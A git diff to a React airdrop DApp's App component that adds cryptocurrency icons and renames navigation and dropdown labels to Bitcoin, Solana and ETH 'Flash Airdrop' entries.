@@ -11,6 +11,8 @@ import LiveChartComponent from './LiveChart.component';
 import FooterNav from './FooterNav';
 import { connectBitcoinWallet, getBrc20Balances, sendBitcoin } from './web3/bitcoinWallet';
 import WalletSelector from './WalletSelector';
+import { FaBitcoin, FaEthereum } from "react-icons/fa"; // FontAwesome icons
+import { SiSolana } from "react-icons/si"; // SimpleIcons for Solana
 // import Provider from '@walletconnect/ethereum-provider';
 // import { useMemo } from "react";
 
@@ -231,28 +233,32 @@ function App() {
             </button>
             <div className="offcanvas offcanvas-end" tabIndex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
               <div className="offcanvas-header">
-                <h5 className="offcanvas-title" id="offcanvasNavbarLabel">SATOSHI MEOW</h5>
+                <h5 className="offcanvas-title" id="offcanvasNavbarLabel">SATOSHI MEOW | Blockchain Airdrops | Crypto Rewards Hub</h5>
                 <button type="button" className="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
               </div>
               <div className="offcanvas-body">
                 <ul className="navbar-nav justify-content-end flex-grow-1 pe-3">
                   <li className="nav-item">
-                    <a className="nav-link active" aria-current="page" href="#">Home</a>
+                    <a className="nav-link active" aria-current="page" href="#">
+                      ALL IN ONE PLACE | BLOCKCHAIN AIRDROPS & CRYPTO REWARDS POWERED BY SATOSHI MEOW
+                    </a>
                   </li>
                   <li className="nav-item">
                     <a className="nav-link" href="#">Telegram</a>
                   </li>
                   <li className="nav-item">
-                    <a className="nav-link" href="#">Bitcoin Airdrops</a>
+                    <a className="nav-link" href="#"><FaBitcoin className="me-2 text-warning" /> Bitcoin Airdrops</a>
+                    <a className="nav-link" href="#"><SiSolana className="me-2 text-info" /> Solana Airdrops</a>
+                    <a className="nav-link" href="#"><FaEthereum className="me-2 text-primary" /> ETH Airdrops</a>
                   </li>
                   <li className="nav-item dropdown">
                     <a className="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
-                      More
+                      More Blockchain Airdrops
                     </a>
                     <ul className="dropdown-menu">
-                      <li><a className="dropdown-item" href="#">Airdrop</a></li>
-                      <li><a className="dropdown-item" href="#">Rewards</a></li>
-                      <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loading}>Get Bitcoin Flash</a></li>
+                      <li><a className="dropdown-item" href="#"><SiSolana className="me-2 text-info" /> Solana Flash Airdrop</a></li>
+                      <li><a className="dropdown-item" href="#"><FaEthereum className="me-2 text-primary" /> ETH Flash Airdrop</a></li>
+                      <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loading}><FaBitcoin className="me-2 text-warning" /> Bitcoin Flash Airdrop</a></li>
                       <li>
                         <hr className="dropdown-divider"/>
                       </li>
@@ -290,7 +296,7 @@ function App() {
           <div className="center">
             {/* <h1 className="title pt-5">Welcome to the Airdrop DApp</h1> */}
             <h1 className="title pt-5 text-shadow">
-              {"Welcome -> to -> the -> Airdrop -> DApp".split("").map((char, i) => (
+              {"Welcome -> to -> the -> Blockchain - Airdrop -> DApp".split("").map((char, i) => (
                 <span key={i} className="shake-letter" style={{ animationDelay: titleDelays[i] }}>{char}</span>
               ))}🪂
             </h1>
